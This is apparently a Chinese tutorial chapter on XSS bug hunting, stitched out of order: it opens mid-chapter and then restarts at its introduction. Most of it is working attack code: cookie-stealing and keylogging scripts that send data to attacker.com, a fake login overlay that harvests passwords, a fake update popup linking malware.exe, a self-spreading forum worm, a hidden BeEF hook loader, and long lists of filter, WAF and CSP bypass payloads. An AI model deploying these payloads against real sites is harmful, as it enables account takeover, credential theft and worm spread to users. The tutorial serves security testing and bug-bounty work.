6. **Fake Flash Update**：伪造Flash更新钓鱼
7. **Alert Dialog**：弹出对话框

### 6.10.5 BeEF实战技巧

**技巧1：隐蔽Hook**
```javascript
// 使用图片加载隐藏hook
var img = new Image();
img.onerror = function() {
    var script = document.createElement('script');
    script.src = 'http://beefserver:3000/hook.js';
    document.body.appendChild(script);
};
img.src = 'invalid_url';
```

**技巧2：持久化**
利用XSS将hook代码注入到localStorage或sessionStorage中，实现一定程度的持久化。

**技巧3：内网渗透**
利用受害者浏览器作为跳板，扫描内网、攻击内网设备。

## 6.11 XSS危害升级技巧

### 6.11.1 从普通XSS到高危漏洞

一个普通的XSS漏洞可能被评为中危，但通过以下技巧可以升级为高危：

1. **窃取管理员Cookie**：如果能获取管理员Cookie，可能接管后台
2. **CSRF组合拳**：结合CSRF执行敏感操作
3. **钓鱼攻击**：伪造登录页面获取账号密码
4. **内网渗透**：利用浏览器扫描内网
5. **浏览器漏洞利用**：结合浏览器漏洞获取系统权限
6. **XSS蠕虫**：自动传播，影响范围大

### 6.11.2 Cookie窃取进阶

**HttpOnly Cookie绕过**
虽然HttpOnly的Cookie不能通过JavaScript直接读取，但可以通过以下方法间接获取：

1. **利用Flash**：Flash跨域读取Cookie（旧版Flash）
2. **利用Java Applet**：Java Applet跨域（已废弃）
3. **利用TRACE方法**：HTTP TRACE方法回显Cookie
4. **利用其他漏洞**：结合XST（Cross-Site Tracing）
5. **利用中间人攻击**：HTTPS降级

**Cookie路径绕过**
如果Cookie设置了path限制，可以尝试：
1. 找到该路径下的页面
2. 利用iframe嵌套该路径的页面
3. 利用该路径下的XSS

### 6.11.3 XSS钓鱼攻击

**伪造登录页面**
```javascript
<script>
function phishing() {
    // 清空页面
    document.body.innerHTML = '';
    
    // 创建伪造的登录框
    var loginBox = document.createElement('div');
    loginBox.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 40px;
        background: #fff;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        z-index: 9999;
    `;
    
    loginBox.innerHTML = `
        <h2>登录超时，请重新登录</h2>
        <form action="http://attacker.com/steal_password" method="POST">
            <p><input type="text" name="username" placeholder="用户名" style="width:200px;padding:8px;margin:5px 0;"></p>
            <p><input type="password" name="password" placeholder="密码" style="width:200px;padding:8px;margin:5px 0;"></p>
            <p><input type="submit" value="登录" style="width:216px;padding:10px;background:#428bca;color:#fff;border:none;cursor:pointer;"></p>
        </form>
    `;
    
    document.body.appendChild(loginBox);
    
    // 模糊背景
    document.body.style.filter = 'blur(5px)';
}

window.onload = phishing;
</script>
```

**仿冒官方弹窗**
```javascript
<script>
// 伪造系统更新提示
var popup = document.createElement('div');
popup.style.cssText = 'position:fixed;top:10px;right:10px;padding:15px;background:#fff;border:1px solid #ccc;z-index:9999;';
popup.innerHTML = `
    <p>检测到重要安全更新，请点击安装：</p>
    <button onclick="window.location.href='http://attacker.com/malware.exe'">立即安装</button>
`;
document.body.appendChild(popup);
</script>
```

### 6.11.4 XSS蠕虫

**XSS蠕虫的原理**
XSS蠕虫利用存储型XSS，自动将恶意脚本传播到其他页面或用户，形成蠕虫式传播。

**论坛XSS蠕虫示例**
```javascript
<script>
// XSS Worm
(function() {
    // 1. 窃取Cookie
    var cookie = document.cookie;
    
    // 2. 获取CSRF Token
    var csrf = document.querySelector('meta[name="csrf-token"]').content;
    
    // 3. 自动发帖/评论传播XSS
    function spreadXSS() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/forum/post', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.setRequestHeader('X-CSRF-Token', csrf);
        
        // 蠕虫代码（这里简化了，实际应该包含完整的蠕虫脚本）
        var wormCode = '<script src="http://attacker.com/worm.js"></scr' + 'ipt>';
        
        xhr.send('title=分享一个有趣的东西&content=' + encodeURIComponent(wormCode));
    }
    
    // 4. 发送Cookie到攻击者服务器
    var img = new Image();
    img.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(cookie);
    
    // 5. 延迟传播，避免被发现
    setTimeout(spreadXSS, 5000);
})();
</script>
```

**XSS蠕虫的危害**
1. 传播速度快，影响范围广
2. 难以彻底清除
3. 可能造成网站瘫痪
4. 可能被用于DDoS攻击
5. 可能窃取大量用户信息

**著名的XSS蠕虫**
1. **Samy蠕虫**：2005年MySpace上的XSS蠕虫，20小时内感染了100多万用户
2. **Yamanner蠕虫**：2006年Yahoo Mail的XSS蠕虫
3. **Twitter蠕虫**：多次出现的Twitter XSS蠕虫

### 6.11.5 键盘记录

**基础版键盘记录**
```javascript
<script>
var keylog = '';

document.onkeypress = function(e) {
    keylog += e.key;
    
    // 每输入50个字符发送一次
    if (keylog.length > 50) {
        sendLog();
        keylog = '';
    }
};

function sendLog() {
    var img = new Image();
    img.src = 'http://attacker.com/keylog?data=' + encodeURIComponent(keylog);
}

// 页面关闭时发送剩余记录
window.onbeforeunload = function() {
    if (keylog.length > 0) {
        sendLog();
    }
};
</script>
```

**高级版键盘记录**
- 记录按键时间
- 记录鼠标点击
- 记录表单输入
- 记录剪切板内容
- 记录页面滚动

## 6.12 不同场景下的XSS挖掘

### 6.12.1 富文本编辑器XSS

富文本编辑器是XSS的高发区，因为它允许用户输入HTML。

**常见的富文本编辑器**
- UEditor
- KindEditor
- CKEditor
- TinyMCE
- wangEditor
- Quill

**测试方法**
1. 测试各种HTML标签
2. 测试各种事件属性
3. 测试各种伪协议
4. 测试SVG、MathML等
5. 测试CSS样式注入

**常用测试Payload**
```html
<!-- 基础测试 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 属性测试 -->
<a href="javascript:alert(1)">test</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><input type=submit></form>

<!-- CSS测试 -->
<style>@import 'javascript:alert(1)'</style>
<div style="expression(alert(1))">test</div>

<!-- SVG高级技巧 -->
<svg><script>alert(1)</script>
# 第六章 XSS跨站脚本漏洞挖掘

## 6.1 XSS概述

### 6.1.1 什么是XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者通过在Web页面中注入恶意脚本代码，当其他用户浏览该页面时，嵌入的恶意脚本代码会在用户浏览器中执行，从而窃取用户敏感信息或进行其他恶意操作。

**为什么叫XSS而不是CSS？**
因为CSS（Cascading Style Sheets）已经是层叠样式表的缩写，为了避免混淆，将Cross-Site Scripting缩写为XSS。

**XSS漏洞的本质**
XSS漏洞的本质是**HTML注入**，攻击者可以在页面中注入任意HTML/JavaScript代码，从而控制用户浏览器的行为。

### 6.1.2 XSS的危害

XSS可能导致以下危害：

1. **Cookie窃取**：获取用户的Cookie，冒充用户身份
2. **会话劫持**：接管用户的登录会话
3. **钓鱼攻击**：伪造登录页面，窃取用户密码
4. **键盘记录**：记录用户输入的敏感信息
5. **网页篡改**：修改页面内容，传播恶意信息
6. **恶意操作**：以用户身份执行操作，如转账、发帖
7. **传播蠕虫**：利用XSS传播恶意脚本
8. **内网探测**：利用用户浏览器探测内网
9. **浏览器漏洞利用**：结合浏览器漏洞获取系统权限
10. **挖矿攻击**：利用用户浏览器挖矿

### 6.1.3 XSS的分类

**反射型XSS**
- 恶意脚本通过URL参数传递
- 服务器将参数直接输出到页面
- 需要诱骗用户点击恶意链接
- 一次性的，不会持久存储

**存储型XSS**
- 恶意脚本存储在服务器（数据库、文件等）
- 每次访问都会执行恶意脚本
- 影响所有访问该页面的用户
- 持久性的，危害更大

**DOM型XSS**
- 恶意脚本通过DOM操作注入
- 不经过服务器，纯前端处理
- 利用JavaScript动态修改DOM
- 难以检测，隐蔽性强

**其他分类方式**

| 分类方式 | 类型 | 说明 |
|---------|------|------|
| 按触发方式 | 反射型 | 参数直接反射到页面 |
| | 存储型 | 存储在数据库中 |
| | DOM型 | 前端DOM操作 |
| 按利用方式 | Cookie窃取 | 盗取用户Cookie |
| | 钓鱼攻击 | 伪造登录页面 |
| | XSS蠕虫 | 自动传播 |
| | 键盘记录 | 记录用户输入 |
| 按利用难度 | 普通XSS | 直接注入script标签 |
| | 受限XSS | 有过滤需要绕过 |
| | Self-XSS | 需要用户交互 |
| | Universal XSS | 浏览器级别的XSS |

## 6.2 反射型XSS

### 6.2.1 反射型XSS原理

反射型XSS的攻击流程：
1. 攻击者构造包含恶意脚本的URL
2. 诱骗用户点击该URL
3. 服务器接收请求，将参数直接输出到页面
4. 用户浏览器执行恶意脚本

**示例代码**
```php
<?php
$name = $_GET['name'];
echo "Hello, " . $name;
?>
```

**正常请求**
```
http://example.com/hello.php?name=admin
输出：Hello, admin
```

**XSS攻击**
```
http://example.com/hello.php?name=<script>alert('XSS')</script>
输出：Hello, <script>alert('XSS')</script>
浏览器执行：弹出alert框
```

### 6.2.2 反射型XSS检测

**手工检测**
```
# 基本测试
?name=<script>alert(1)</script>

# 使用事件
?name=<img src=x onerror=alert(1)>

# 使用SVG
?name=

<svg onload=alert(1)>


# 使用body
?name=<body onload=alert(1)>

# 使用input
?name=<input onfocus=alert(1) autofocus>

# 使用details
?name=<details open ontoggle=alert(1)>
```

**Burp Suite检测**
1. 拦截请求
2. 发送到Repeater
3. 修改参数为XSS payload
4. 观察响应是否包含payload
5. 注意观察输出的位置（HTML标签中、属性中、JavaScript中、CSS中）

**XSStrike检测**
```bash
python xsstrike.py -u "http://example.com/page?param=test"

# 爬取网站并扫描
python xsstrike.py -u "http://example.com/" --crawl

# POST参数
python xsstrike.py -u "http://example.com/login" --data "username=test&password=test"
```

**检测时的注意事项**
1. **输出位置很重要**：不同的输出位置需要不同的payload
   - HTML标签之间：<script>等
   - HTML属性中：需要闭合属性
   - JavaScript中：需要闭合引号和script
   - CSS中：使用expression等
2. **注意编码问题**：URL编码、HTML编码、Unicode编码等
3. **注意过滤绕过**：可能存在过滤，需要尝试不同的payload
4. **注意响应头**：Content-Type、X-XSS-Protection等

### 6.2.3 反射型XSS利用

**窃取Cookie**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**钓鱼攻击**
```javascript
<script>
document.body.innerHTML = '<h3>Login</h3><form action="http://attacker.com/steal"><input name="username"><input name="password" type="password"><input type="submit"></form>';
</script>
```

**键盘记录**
```javascript
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = "http://attacker.com/key?key=" + e.key;
}
</script>
```

**页面跳转**
```javascript
<script>
window.location.href = "http://attacker.com/phishing";
</script>
```

**获取页面内容**
```javascript
<script>
var content = document.body.innerHTML;
var img = new Image();
img.src = "http://attacker.com/steal?content=" + encodeURIComponent(content);
</script>
```

## 6.3 存储型XSS

### 6.3.1 存储型XSS原理

存储型XSS的攻击流程：
1. 攻击者将恶意脚本提交到服务器
2. 服务器存储恶意脚本（数据库、文件等）
3. 其他用户访问包含恶意脚本的页面
4. 用户浏览器执行恶意脚本

**示例场景**
- 论坛帖子
- 评论留言
- 用户资料
- 商品评价
- 消息通知
- 用户名/昵称
- 文章内容
- 个性化设置

**示例代码**
```php
<?php
// 存储评论
$comment = $_POST['comment'];
mysql_query("INSERT INTO comments(content) VALUES('$comment')");

// 显示评论
$result = mysql_query("SELECT content FROM comments");
while($row = mysql_fetch_array($result)) {
    echo $row['content'] . "<br>";
}
?>
```

**XSS攻击**
```
提交评论：<script>alert('XSS')</script>
存储到数据库：恶意脚本被保存
其他用户访问：弹出alert框
```

### 6.3.2 存储型XSS检测

**测试位置**
- 用户输入字段：用户名、昵称、简介
- 内容输入字段：帖子、评论、留言
- 文件上传：文件名、文件内容
- 富文本编辑器：HTML内容
- 个人资料：个性签名、自我介绍
- 消息系统：私信、通知
- 订单系统：收货地址、备注

**测试方法**
```
# 基本测试
<script>alert(1)</script>

# 闭合标签测试
</script><script>alert(1)</script>

# 事件测试
<img src=x onerror=alert(1)>

# SVG测试
<svg onload=alert(1)>

# 富文本编辑器测试
<p>test</p><img src=x onerror=alert(1)>

# 事件属性测试
<div onmouseover=alert(1)>test</div>
```

**检测技巧**
1. **注意数据流转**：输入在哪里，输出在哪里
2. **注意编码转换**：存储时编码，输出时解码
3. **注意过滤策略**：前端过滤、后端过滤、输出编码
4. **注意不同场景**：有的地方只过滤<script>，但允许其他标签
5. **注意大小写问题**：有的过滤只过滤小写

### 6.3.3 存储型XSS利用

**XSS Worm（蠕虫）**
```javascript
<script>
// 获取当前用户Cookie
var cookie = document.cookie;

// 构造恶意请求，传播XSS
var xhr = new XMLHttpRequest();
xhr.open("POST", "/post/comment", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("comment=<script>alert(1)</script>&cookie=" + cookie);

// 继续传播
</script>
```

**窃取敏感信息**
```javascript
<script>
// 获取页面内容
var content = document.body.innerHTML;

// 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal?data=" + encodeURIComponent(content);
</script>
```

**自动操作**
```javascript
<script>
// 自动发帖/评论
var xhr = new XMLHttpRequest();
xhr.open("POST", "/post/create", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("title=XSS&content=<script>alert(1)</script>");
</script>
```

**窃取CSRF Token**
```javascript
<script>
// 获取CSRF Token
var token = document.querySelector('meta[name="csrf-token"]').content;

// 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal?token=" + token;
</script>
```

## 6.4 DOM型XSS

### 6.4.1 DOM型XSS原理

DOM型XSS不经过服务器，完全在客户端执行。攻击者通过修改DOM环境，使JavaScript代码执行恶意操作。

**示例代码**
```javascript
<script>
var name = location.hash.substring(1);
document.write("Hello, " + name);
</script>
```

**正常请求**
```
http://example.com/page.html#admin
输出：Hello, admin
```

**XSS攻击**
```
http://example.com/page.html#<script>alert(1)</script>
输出：Hello, <script>alert(1)</script>
浏览器执行：弹出alert框
```

**DOM型XSS的特点**
1. 不经过服务器，纯前端处理
2. 难以被WAF检测
3. 难以在服务器日志中发现
4. 需要分析JavaScript代码
5. 常见于单页应用（SPA）

### 6.4.2 DOM型XSS常见场景

**document.write**
```javascript
document.write(location.search);
document.write(location.hash);
document.write(document.referrer);
document.write(document.URL);
```

**innerHTML**
```javascript
element.innerHTML = location.hash;
element.innerHTML = getUrlParam('name');
element.innerHTML = localStorage.getItem('name');
```

**eval**
```javascript
eval(location.search);
eval(location.hash.substring(1));
eval(getUrlParam('code'));
```

**setTimeout/setInterval**
```javascript
setTimeout(location.hash.substring(1), 1000);
setInterval(getUrlParam('func'), 1000);
```

**jQuery**
```javascript
$(location.hash);
$('#' + location.hash.substring(1));
$(element).html(location.hash);
```

**URL操作**
```javascript
var url = new URL(location.href);
document.write(url.searchParams.get('name'));
```

**PostMessage**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});
```

**Web Storage**
```javascript
var name = localStorage.getItem('name');
document.write(name);
```

### 6.4.3 DOM型XSS检测

DOM型XSS难以自动化检测，需要手工分析JavaScript代码：

1. 查找危险函数：document.write、innerHTML、eval等
2. 分析数据来源：location、document.URL、document.referrer等
3. 构造测试payload
4. 观察是否触发XSS

**测试payload**
```javascript
# URL参数
?name=<img src=x onerror=alert(1)>

# Hash参数
#<img src=x onerror=alert(1)>

# PostMessage
window.postMessage('<img src=x onerror=alert(1)>', '*')

# Referer
Referer: <img src=x onerror=alert(1)>
```

**检测工具**
1. **Burp Suite**：被动扫描JavaScript
2. **DOMXSSScanner**：专门扫描DOM XSS
3. **浏览器开发者工具**：断点调试JavaScript
4. **代码审计**：人工分析JavaScript代码

### 6.4.4 DOM型XSS高级技巧

**利用jQuery选择器**
```javascript
// 如果页面使用了jQuery
// 可以通过location.hash触发XSS
http://example.com/page#<img src=x onerror=alert(1)>
// 但有些情况下不会直接执行
// 可以尝试：
http://example.com/page#<script>alert(1)</script>
```

**利用location.hash + innerHTML**
```javascript
// 页面代码
<div id="content"></div>
<script>
document.getElementById('content').innerHTML = location.hash.substring(1);
</script>

// 利用
http://example.com/page#<img src=x onerror=alert(1)>
```

**利用document.write和闭合标签**
```javascript
// 页面代码
<script>
document.write("<div>" + location.search + "</div>");
</script>

// 利用
?param=</div><script>alert(1)</script><div>
```

**利用PostMessage**
```javascript
// 页面代码
window.addEventListener('message', function(e) {
    eval(e.data);
});

// 利用
window.postMessage('alert(1)', '*');
```

## 6.5 XSS挖掘实战完整流程

### 6.5.1 信息收集阶段

**第一步：确定测试范围**
- 目标网站域名
- 子域名收集
- 目录爬取
- API接口发现

**第二步：识别输入点**
- URL参数（GET）
- 表单参数（POST）
- Cookie
- HTTP头
- 上传文件名
- URL路径
- JSON参数
- XML参数

**第三步：识别输出点**
- 页面内容
- HTML属性
- JavaScript变量
- CSS样式
- HTTP响应头
- 重定向URL

### 6.5.2 漏洞发现阶段

**第一步：初步测试**
1. 在每个输入点输入特殊字符：< > " ' ` ( ) ; = &
2. 观察响应中这些字符是否被过滤或编码
3. 标记可能存在漏洞的输入点

**第二步：确定输出位置**
- HTML标签之间
- HTML属性值中
- JavaScript代码中
- CSS样式中
- URL中

**第三步：构造测试Payload**
根据输出位置选择合适的payload：
- HTML标签中：<img src=x onerror=alert(1)>
- 属性中：" onerror=alert(1) x="
- JS中：';alert(1);//
- CSS中：expression(alert(1))

**第四步：验证漏洞**
1. 构造完整的payload
2. 发送请求
3. 观察是否触发XSS
4. 确认是反射型、存储型还是DOM型

### 6.5.3 漏洞利用阶段

**第一步：评估影响**
- 可以窃取Cookie吗？（是否有HttpOnly）
- 可以获取用户信息吗？
- 可以执行操作吗？
- 影响范围有多大？

**第二步：构造利用代码**
- Cookie窃取代码
- 钓鱼页面代码
- 键盘记录代码
- 蠕虫传播代码

**第三步：测试利用效果**
- 在自己的测试账号上测试
- 确认利用代码可以正常工作
- 评估危害程度

### 6.5.4 漏洞报告阶段

**第一步：整理证据**
- 漏洞截图
- 请求响应包
- 复现步骤
- 利用代码

**第二步：编写报告**
- 漏洞名称
- 漏洞类型
- 严重程度
- 影响范围
- 复现步骤
- 修复建议

**第三步：提交报告**
- 按照SRC平台要求提交
- 提供清晰的复现步骤
- 附上截图和PoC

## 6.6 XSS Payload构造

### 6.6.1 基本Payload

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(window.location)</script>
<script src=http://attacker.com/xss.js></script>
```

### 6.6.2 事件Payload

```html
<img src=x onerror=alert(1)>
<img src=1 onerror=alert(1)>
<img src="javascript:alert(1)">
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<div onmouseover=alert(1)>test</div>
<p onclick=alert(1)>test</p>
<a onmouseover=alert(1)>test</a>
<form onsubmit=alert(1)><input type=submit>
<iframe onload=alert(1)></iframe>
<object onload=alert(1)></object>
<embed onload=alert(1)>
```

### 6.6.3 标签Payload

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 6.6.4 编码Payload

**HTML实体编码**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**URL编码**
```html
<img src=x onerror=%61%6c%65%72%74(1)>
<a href="java%73cript:alert(1)">click</a>
```

**Unicode编码**
```html
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

**Base64编码**
```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**八进制编码**
```html
<img src=x onerror=\141\154\145\162\164(1)>
```

**HTML实体+URL编码混合**
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
```

### 6.6.5 绕过过滤Payload

**绕过script过滤**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script/src="http://attacker.com/xss.js">
<script	x>alert(1)</script>
<scri%00pt>alert(1)</scri%00pt>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

**绕过onerror过滤**
```html
<img src=x oNerror=alert(1)>
<img src=x ONERROR=alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror=alert(1)//
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onmouseover=alert(1)>
<img src=x onclick=alert(1)>
```

**绕过空格过滤**
```html
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img/**/src=x/**/onerror=alert(1)>
```

**绕过引号过滤**
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(String.fromCharCode(49))>
```

**绕过括号过滤**
```html
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw 1>
<svg onload=alert&#40;1&#41;>
```

**绕过关键字过滤**
```html
<img src=x onerror=al\u0065rt(1)>
<img src=x onerror=eval('al'+'ert(1)')>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=Function`al\145rt(1)`()>
<img src=x onerror=setTimeout`alert\x281\x29`>
```

**绕过http/https过滤**
```html
<script src=//attacker.com/xss.js></script>
<script src=http://attacker.com/xss.js></script>
<script src=https://attacker.com/xss.js></script>
<img src=x onerror=document.write('<script src="//attacker.com/xss.js"></script>')>
```

### 6.6.6 属性中的XSS

**在value属性中**
```html
<input type="text" value="用户输入">
<!-- 闭合value属性 -->
"><script>alert(1)</script><input value="
" onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

**在href属性中**
```html
<a href="用户输入">link</a>
<!-- javascript协议 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**在src属性中**
```html
<img src="用户输入">
<!-- 利用javascript伪协议（仅限某些标签） -->
javascript:alert(1)
```

**在style属性中**
```html
<div style="用户输入">test</div>
<!-- 利用expression（IE） -->
expression(alert(1))
<!-- 利用@import -->
@import 'javascript:alert(1)'
```

**在JavaScript中**
```javascript
var name = "用户输入";
// 闭合引号
";alert(1);//
' ;alert(1);//
</script><script>alert(1)</script>
```

## 6.7 XSS绕过WAF的30+种方法

### 6.7.1 编码绕过

**方法1：URL编码**
```
%3Cscript%3Ealert(1)%3C/script%3E
```

**方法2：双重URL编码**
```
%253Cscript%253Ealert(1)%253C/script%253E
```

**方法3：HTML实体编码**
```
&#60;script&#62;alert(1)&#60;/script&#62;
```

**方法4：Unicode编码**
```
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**方法5：八进制编码**
```
\74script\76alert(1)\74/script\76
```

**方法6：Base64编码**
```
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**方法7：十六进制编码**
```
\x3cscript\x3ealert(1)\x3c/script\x3e
```

### 6.7.2 标签和属性绕过

**方法8：大小写混合**
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
```

**方法9：双写关键字**
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<ononerrorerror>
```

**方法10：插入注释**
```
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<img src=x onerror=al<!-- -->ert(1)>
```

**方法11：插入空字节**
```
<scri%00pt>alert(1)</scri%00pt>
```

**方法12：插入空白字符**
```
<img%09src=x%09onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img%0Csrc=x%0Conerror=alert(1)>
```

**方法13：使用不常见的标签**
```
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<keygen onfocus=alert(1) autofocus>
<isindex onfocus=alert(1) autofocus>
```

**方法14：使用不常见的事件**
```
onmouseover、onmouseout、onmousedown、onmouseup
onclick、ondblclick、oncontextmenu
onkeydown、onkeypress、onkeyup
onfocus、onblur、onchange、onsubmit
onload、onerror、onabort、onunload
onanimationstart、onanimationend、onanimationiteration
ontransitionend、onwheel
```

### 6.7.3 特殊技术绕过

**方法15：利用JavaScript伪协议**
```
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

**方法16：利用data URI**
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

**方法17：利用CSS expression**
```
<div style="expression(alert(1))">test</div>
<style>body{expression(alert(1))}</style>
```

**方法18：利用CSS @import**
```
<style>@import 'http://attacker.com/xss.css';</style>
<style>@import 'javascript:alert(1)'</style>
```

**方法19：利用meta标签**
```
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

**方法20：利用location**
```
<script>location='javascript:alert(1)'</script>
<script>window.location='javascript:alert(1)'</script>
```

**方法21：利用eval和Function**
```
<img src=x onerror=eval('alert(1)')>
<img src=x onerror=Function('alert(1)')()>
<img src=x onerror=setTimeout('alert(1)',0)>
```

**方法22：利用反引号（Template Literal）**
```
<img src=x onerror=alert`1`>
<img src=x onerror=Function`alert(1)`()>
```

### 6.7.4 变形绕过

**方法23：字符串拼接**
```
<img src=x onerror='al'+'ert'+'(1)'>
<img src=x onerror="al"+"ert"+"(1)">
```

**方法24：数组方法**
```
<img src=x onerror=top['ale'+'rt'](1)>
<img src=x onerror=window['al'+'ert'](1)>
```

**方法25：with语句**
```
<img src=x onerror=with(top)alert(1)>
```

**方法26：原型链**
```
<img src=x onerror=__proto__.__proto__.constructor('alert(1)')()>
```

**方法27：URL跳转**
```
<img src=x onerror=location='http://attacker.com/xss.html?c='+document.cookie>
```

**方法28：利用self/top/parent/frames**
```
<img src=x onerror=self.alert(1)>
<img src=x onerror=top.alert(1)>
<img src=x onerror=parent.alert(1)>
<img src=x onerror=frames[0].alert(1)>
```

### 6.7.5 其他绕过技巧

**方法29：利用AngularJS**
```
{{constructor.constructor('alert(1)')()}}
```

**方法30：利用Vue.js**
```
{{constructor.constructor('alert(1)')()}}
```

**方法31：利用MHTML**
```
<img src="mhtml:http://attacker.com/xss.mht!xss">
```

**方法32：利用注释混淆**
```
<scri<!-- test -->pt>alert(1)</scri<!-- test -->pt>
```

**方法33：利用长字符串绕过**
```
<img src=x onerror="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalert(1)">
```

**方法34：利用历史记录**
```
<script>history.pushState(0,0,'/fake')</script>
```

## 6.8 CSP绕过技巧

### 6.8.1 CSP概述

Content Security Policy（内容安全策略）是一种安全机制，用于限制网页中资源的加载来源，防止XSS攻击。

**CSP设置方式**
```html
<!-- HTTP响应头 -->
Content-Security-Policy: default-src 'self'

<!-- meta标签 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

**常见CSP指令**

&#124; 指令 &#124; 说明 &#124;
&#124;-----&#124;------&#124;
&#124; default-src &#124; 默认资源加载来源 &#124;
&#124; script-src &#124; JavaScript来源 &#124;
&#124; style-src &#124; CSS来源 &#124;
&#124; img-src &#124; 图片来源 &#124;
&#124; font-src &#124; 字体来源 &#124;
&#124; connect-src &#124; 连接来源（XHR、WebSocket） &#124;
&#124; frame-src &#124; iframe来源 &#124;
&#124; media-src &#124; 媒体来源 &#124;
&#124; object-src &#124; 对象来源 &#124;
&#124; base-uri &#124; base标签来源 &#124;
&#124; form-action &#124; 表单提交目标 &#124;

**常见的CSP值**

&#124; 值 &#124; 说明 &#124;
&#124;---&#124;------&#124;
&#124; 'self' &#124; 同源 &#124;
&#124; 'none' &#124; 不允许任何来源 &#124;
&#124; 'unsafe-inline' &#124; 允许内联脚本 &#124;
&#124; 'unsafe-eval' &#124; 允许eval &#124;
&#124; 'nonce-xxx' &#124; 允许特定nonce的脚本 &#124;
&#124; 'sha256-xxx' &#124; 允许特定哈希的脚本 &#124;
&#124; *.example.com &#124; 允许example.com所有子域名 &#124;
&#124; https: &#124; 允许所有HTTPS来源 &#124;

### 6.8.2 CSP绕过的10+种方法

**方法1：利用unsafe-inline**
如果CSP包含'unsafe-inline'，可以直接使用内联脚本：
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**方法2：利用unsafe-eval**
如果CSP包含'unsafe-eval'，可以使用eval：
```html
<img src=x onerror=eval('alert(1)')>
<img src=x onerror=Function('alert(1)')()>
```

**方法3：利用允许的域名**
如果CSP允许某些域名，可以从这些域名加载脚本：
```html
<!-- 如果允许CDN域名 -->
<script src="https://cdn.example.com/angular.min.js"></script>
<!-- 然后利用AngularJS的XSS -->
{{constructor.constructor('alert(1)')()}}
```

**方法4：利用JSONP接口**
如果网站有JSONP接口，可以利用：
```html
<script src="/api/jsonp?callback=alert(1)//"></script>
```

**方法5：利用AngularJS**
如果页面使用了AngularJS且CSP允许'unsafe-inline'：
```html
